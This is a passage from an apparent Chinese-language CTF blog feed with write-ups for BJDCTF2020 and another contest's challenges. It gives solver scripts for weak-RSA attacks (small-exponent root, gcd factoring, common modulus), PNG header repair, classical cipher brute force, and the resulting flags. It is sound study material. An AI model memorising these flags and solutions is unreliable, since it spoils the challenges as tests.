punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            flag1 <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span>             <span class="token keyword">break</span> <span class="token comment">#第二段flag低公钥e爆破 </span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot <span class="token keyword">import</span> libnum e <span class="token operator">=</span> <span class="token number">0x3</span> n <span class="token operator">=</span><span class="token number">10456335904838169914349646852830082932152130624533179855437700729986430916359910968035371355128152016750075271161129744979254605922991030753616570849211931989112941277121682363790710646503345520505931418350219098036569932546893477983585713668853372819392130314661542626399462820378837771792293945490048339575869129479058678981790418112887403292721775644533540769467889512773382494878291574262142755186374570245813695390664702262226281601456889176191920270658811753696081082528539263191477192236336112147705564796435800152614366113854349615104191052807647128834113146535639155857819697492608839941056356828288393881491</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>     res <span class="token operator">=</span> iroot<span class="token punctuation">(</span>c2 <span class="token operator">+</span> k <span class="token operator">*</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token comment"># c+k*n 开3次方根 能开3次方即可 </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         flag2 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 转为字符串 </span>        <span class="token keyword">break</span>     k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span> <span class="token comment">#e = 6709 </span><span class="token comment">#flag = b'flag&#123;you_get_1t!&#125;'exp: </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-HardRSA"><a href="#4-HardRSA" class="headerlink" title="4.HardRSA"></a>4.HardRSA</h3><p>给了hint和p，q的关系，同时又知道n，我们需要构造一个p或者q的倍数和n进行最大公约，得到p或者 </p><p>q。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> n <span class="token operator">=</span> <span class="token number">124993585424296591093467762244475251138759316583406117657133238536553852339669769400523449633693296145543303393465079699542574868451705092731269012710274047742582156286940702286646643111975860760853620625924935057792931203893647049496628704891431372213711245207398212732529309490088729910948745640748736955073</span> c <span class="token operator">=</span> <span class="token number">50424006770352436334712623677416186679749743823334436526623823505393135268471235757954106626248672896094704432397859493914371835003999982028550123956410656701321293836439453483634735255591270239182001956026055818185575266979363172614844927196934018068753541437103088119691563904347098094997053933889342339430</span> hint <span class="token operator">=</span><span class="token number">95947821330255050044792695953225981695564565853431169112620146574854785547870212826519391606210465121248955917602550813434927609689055640312953524952635919431672688325438812967089917271116316877318959974024993544935124710051420914708812538221556136784742855036819112563084588872068036526345880570488594712154</span> e <span class="token operator">=</span> <span class="token number">65537</span> kp <span class="token operator">=</span> hint<span class="token operator">-</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token number">1011</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token punctuation">)</span> p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span>kp<span class="token punctuation">)</span> q <span class="token operator">=</span> n <span class="token operator">//</span> p phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span> flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#b'flag&#123;math_1s_important&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-古典密码"><a href="#5-古典密码" class="headerlink" title="5.古典密码"></a>5.古典密码</h3><p><strong>猪圈密码</strong> ,<strong>圣堂武士密码</strong> ,<strong>标准银河字母</strong>解出来 FGCPFLIRTUASYON </p><p>最后提示说栅栏,那就栅栏解密,分栏为3时解出来 FLAGISCRYPTOFUN </p><p>flag{CRYPTOFUN}</p><h2 id="3-WEB"><a href="#3-WEB" class="headerlink" title="3.WEB"></a>3.WEB</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020</title>
      <link href="/2021/12/03/BJDCTF2020/"/>
      <url>/2021/12/03/BJDCTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="1-签到"><a href="#1-签到" class="headerlink" title="1 签到"></a>1 签到</h4><p>一个简单的隐写题目， 压缩包里面有个hello.zip，用winhex打开，可以知道这是一张图片，改成png，打开发现是一个二维码，扫二维码得到flag：<code>xaflag&#123;i_am_a_tupian&#125; </code></p><h4 id="2-藏藏藏"><a href="#2-藏藏藏" class="headerlink" title="2 藏藏藏"></a>2 藏藏藏</h4><p> binwalk发现zip压缩包，使用foremost分离然后解压，得到福利.docx，打开里面又一个二维码，扫码得到<code>flag&#123;you are the best!&#125;</code></p><h4 id="3-认真你就输了"><a href="#3-认真你就输了" class="headerlink" title="3 认真你就输了"></a>3 认真你就输了</h4><p> 解压出来xls，binwalk分离文件得到flag.txt，打开得到flag：<code>flag&#123;M9eVfi2Pcs#&#125; </code></p><h4 id="4-你猜我是个啥"><a href="#4-你猜我是个啥" class="headerlink" title="4 你猜我是个啥"></a>4 你猜我是个啥</h4><p>是一个无法打开的zip压缩包，file命令查看发现是个png图片，直接cat即可得到flag.</p><h4 id="5-鸡你太美"><a href="#5-鸡你太美" class="headerlink" title="5 鸡你太美"></a>5 鸡你太美</h4><p><code>GIF89a</code>这个文件头丢失,<code>winhex</code>打开，填上4个字节，修复文件头，得到<code>flag</code></p><h4 id="6-纳尼"><a href="#6-纳尼" class="headerlink" title="6 纳尼"></a>6 纳尼</h4><p>和上一个题一样，还是缺了4位二进制数，打开winhex修复gif文件头，补充47,49,46,38，然后把 gif 不同帧连起来得到一个base64，Q1RGe3dhemdfYmFvX3FpYW5nX2lzX3NhZH0=解密后得到一段有问题的flag。<code>CTF&#123;wazg_bao_qiang_is_sad&#125;</code>这个实际上有点问题，我怀疑是我输入出错了<code>CTF&#123;wang_bao_qiang_is_sad&#125;</code></p><p>王宝强很悲伤。</p><h4 id="7-just-a-rar"><a href="#7-just-a-rar" class="headerlink" title="7 just a rar"></a>7 just a rar</h4><p>解压出来一个rar名称为 4 位数，爆破得到密码：2016，一张青雉的图片，用 stegsolve 打开使用 Analyse 分析，找到<code>flag &#123;Wadf_123&#125;</code></p><h4 id="8-一叶障目"><a href="#8-一叶障目" class="headerlink" title="8 一叶障目"></a>8 一叶障目</h4><p>png 的 CRC 校验问题，图片的宽高被改了导致无法打开，这里有我之前在一个ctf地图平台上找到了一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"图片地址："</span><span class="token punctuation">)</span>fr <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token punctuation">:</span> <span class="token builtin">bytearray</span> <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">0x0c</span><span class="token punctuation">:</span><span class="token number">0x1d</span><span class="token punctuation">]</span><span class="token punctuation">)</span>crc32key <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">0x1d</span><span class="token punctuation">:</span><span class="token number">0x21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#原来的代码: crc32key = eval(str(fr[29:33]).replace('\\x','').replace("1b'",'0x').replace("'",''))</span>n <span class="token operator">=</span> <span class="token number">4095</span><span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    width <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        height <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>        crc32result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>            newpic <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>fr<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            fw <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>newpic<span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag <code>xaflag&#123;66666&#125;</code></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h4 id="1-签到-1"><a href="#1-签到-1" class="headerlink" title="1 签到"></a>1 签到</h4><p>十六进制转字符串即可得flag   <code>BJD&#123;We1c0me_t4_BJDCTF&#125;</code></p><h4 id="2-编码与调制"><a href="#2-编码与调制" class="headerlink" title="2 编码与调制"></a>2 编码与调制</h4><blockquote><p> 本题灵感来自2019年第三届i春秋的11月月赛，主要是想对曼切斯特编码进行考察，其中为了提供一下思路，给了一张code的图片作为提示，当然也可以直接自行百度这种编码方式，毕竟他的编码方式也很有特点，仅采用了4种字符，百度一下也可以找到解决方案 编码规则，直接复制的百度百科 在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“1”，从低到高跳变表示“0”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。 编程思路： 而我们在编程实现时，也很简单只要先将明文转成二进制（也就是先进行NRZ编码），而后对于其中的高电平‘1’，用‘10’替换，低电平‘0’，用‘01’替换，获得一串新的二进制比特流，最后再将其进行16进制封装即可 解码思路： 解码也就是一个逆过程，先将hex转成bin，在一步步替换‘10’为‘1’，‘01’为‘0’ 下面给出解密脚本： </p></blockquote><p>直接放官方的答案吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msg<span class="token operator">=</span><span class="token number">0x2559659965656a9a65656996696965a6695669a9695a699569666a5a6a6569666a59695a69aa696569666aa6</span>s<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>r<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> <span class="token string">'1'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> <span class="token string">'0'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**BJD{DifManchestercode} **</p><h4 id="3-Polybius"><a href="#3-Polybius" class="headerlink" title="3 Polybius"></a>3 Polybius</h4><blockquote><p>密文：ouauuuoooeeaaiaeauieuooeeiea hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ= 首先将hint base64解密查看提示：The length of this plaintext: 14 而后再观察一下发现密文长度时28位，所以猜测是棋盘密码（额，其实题目就已经提示加密方式了） 观察发现一共有五个字母重复出现在密文中，所以可能的加密表是aeiou，但是解出结果会发现是乱码，所以可以尝试爆破，一共也就5！种情况。 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolskey <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>cipher <span class="token operator">=</span> <span class="token string">"ouauuuoooeeaaiaeauieuooeeiea"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span><span class="token string">'aeiou'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> each <span class="token keyword">in</span> key<span class="token punctuation">:</span>    temp_cipher <span class="token operator">=</span> <span class="token string">""</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> temp <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp_cipher <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>each<span class="token punctuation">.</span>index<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#这里其实是将字母的表换成数字的表以便后续计算</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        current_ascii <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span>     <span class="token comment">#因为棋盘密码是采用两位一起表示一个字母</span>        <span class="token keyword">if</span> current_ascii<span class="token operator">></span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            current_ascii<span class="token operator">+=</span><span class="token number">1</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>current_ascii<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag        **BJD{flagispolybius} **</p><p>4 easyrsa</p><p>很简单的一个rsa，就是再求取欧拉函数是对于(p-1)(q-1)的获取要先进行一步转换，题中给出了p和q的关系式，及一个求导的过程，化简后可以得出<code>z=p^2+q^2</code>,最后再根据<code>n=p * q</code>,即可得出<code>（p-1）*（q-1） </code>下面是exp：</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn<span class="token operator">=</span><span class="token number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>z<span class="token operator">=</span><span class="token number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>c<span class="token operator">=</span><span class="token number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>e<span class="token operator">=</span><span class="token number">65537</span>p_and_q_square <span class="token operator">=</span> z <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>n <span class="token comment">#这个要通过化简一下z就可以发现其中的关系，其实就是简单的导数化简</span>p_and_q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p_and_q_square<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#(mpz(250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442), True)</span>final_p_and_q <span class="token operator">=</span> <span class="token number">250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442</span>Euler_function <span class="token operator">=</span> n <span class="token operator">-</span> final_p_and_q <span class="token operator">+</span> <span class="token number">1</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>Euler_function<span class="token punctuation">)</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-rsa-output"><a href="#5-rsa-output" class="headerlink" title="5 rsa_output"></a>5 rsa_output</h4><p>题目描述直接给出，模的相关攻击，再看一下给出的附件，发现两次的N是相同的，所以可以确定是共模攻击</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>e1 <span class="token operator">=</span> <span class="token number">2767</span>e2 <span class="token operator">=</span> <span class="token number">3659</span>message1 <span class="token operator">=</span> <span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>message2 <span class="token operator">=</span> <span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><span class="token comment"># s &amp; t</span>gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token operator">-</span>s    message1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>message1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> <span class="token operator">-</span>t    message2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>message2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>plain <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>message1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>message2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-伏羲六十四卦"><a href="#8-伏羲六十四卦" class="headerlink" title="8 伏羲六十四卦"></a>8 伏羲六十四卦</h4><p>套娃题目，这个是哪个人才像出来的？</p><p>伏羲六十四卦： 题目中给出了几段描述，大致可以猜测一下可能会有多层加密 首先一开始提到六十四卦，百度一下，可以看到其实是利用六位二进制对文字进行替换，根据其二进制矩阵先构造码表，然后根据码表将密文转成二进制： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span 